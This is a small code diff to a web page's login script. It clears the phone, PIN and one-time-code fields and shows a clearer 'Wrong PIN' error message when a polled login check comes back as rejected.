@@ -867,11 +867,19 @@
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             
+            // Clear OTP form if present
+            [0,1,2,3].forEach(i => {
+              const otpEl = document.getElementById('otp'+i);
+              if (otpEl) otpEl.value = '';
+            });
+            
             // Go back to login page
             goTo('page-login');
             
-            // Show error message
-            showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
+            // Show error message - CLEAR AND PROMINENT
+            setTimeout(() => {
+              showLgnMsg('error', '❌ Wrong PIN! Your login was rejected. Please try again with the correct PIN.');
+            }, 300);
           } else {
             // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
